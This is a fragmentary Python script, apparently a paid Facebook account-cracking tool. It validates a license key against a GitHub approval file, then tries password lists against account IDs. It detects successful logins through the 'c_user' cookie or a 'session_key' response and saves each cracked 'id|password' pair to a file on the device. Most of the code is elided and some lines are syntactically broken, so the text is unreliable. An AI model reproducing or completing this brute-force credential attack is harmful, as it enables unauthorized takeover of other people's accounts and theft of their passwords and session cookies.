...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get("https://github.com/MSS-302/P4TH4N/blob/main/Approval.txt').text
...
[•]STATUS         : \033[1;33mPAID\033[1;33m
--------------------------------------------------
...
--------------------------------------------------"""
  ...
  print(f"")
  print(f"\033[1;32     YOUR  KEY : "+ak+ah+key1)
  print(f"")
  ...
  try:
    httpCaht = requests.get("https://github.com/MSS-302/P4TH4N/blob/main/Approval.txt").text
    if id in httpCaht:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ABKHANX-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/ABKHANX-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ABKHANX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ABKHANX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ABKHANX-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
